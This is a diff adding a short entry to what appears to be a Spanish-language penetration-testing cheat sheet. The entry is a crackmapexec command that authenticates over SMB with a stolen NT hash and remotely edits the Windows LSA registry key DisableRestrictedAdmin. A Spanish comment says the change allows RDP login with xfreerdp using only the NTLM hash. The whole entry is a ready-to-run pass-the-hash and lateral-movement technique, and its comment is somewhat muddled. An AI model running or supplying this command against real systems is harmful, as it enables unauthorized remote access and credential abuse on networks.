@@ -1,0 +1,3 @@
+	### Crackmapexec
+crackmapexec smb 192.168.0.1 -u "username" -H "NT_HASH" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+#Sirve para deshabilitar la restriccion de loguearse con password para el usuario Admin lo que evitar poder loguearnos con xfreerdp y el hash NTLM
